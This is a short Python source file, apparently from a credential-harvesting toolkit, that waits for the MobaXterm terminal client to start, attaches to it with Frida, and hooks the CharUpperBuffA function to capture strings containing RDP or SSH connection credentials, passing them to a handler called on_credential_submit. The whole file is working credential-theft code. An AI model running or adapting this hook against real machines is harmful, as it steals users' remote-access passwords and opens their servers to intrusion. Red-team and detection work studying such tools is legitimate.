from PyHook import wait_for_process, on_credential_submit
import frida


def wait_for():
    wait_for_process(["MobaXterm.exe"], "MobaXterm", hook)


def hook(pid):
    try:
        print("[ mobaxterm-hook ] Trying To Attach To MobaXterm")
        session = frida.attach(pid)
        print(f"[ mobaxterm-hook ] Attached to MobaXterm pid {pid}!")
        script = session.create_script("""

		var creds;
		var CharUpperBuffA = Module.findExportByName("User32.dll", "CharUpperBuffA")
		Interceptor.attach(CharUpperBuffA, {
			onEnter: function (args) 
			{
				creds = args[0];
				var data = creds.readAnsiString()

				if (data)
				{
					if(data.includes("rdp:"))
					{
						send("\\n=============================" + "\\n[+] Intercepted Creds from MobaXtermRDP" +"\\n"+ "Keyword    : " + data + "\\n=============================");
					}
					if(data.includes(", 22 ,"))
					{
						send("\\n=============================" + "\\n[+] Intercepted Creds from MobaXtermSSH" +"\\n"+ "Keyword    : " + data + "\\n=============================");
					}

				}	
			}
		});

		""")
        script.on('message', on_credential_submit)
        script.load()

    except Exception as e:
        print("[ mobaxterm-hook ] Unhandled exception: " + str(e))
        print("[ mobaxterm-hook ] Continuing...")
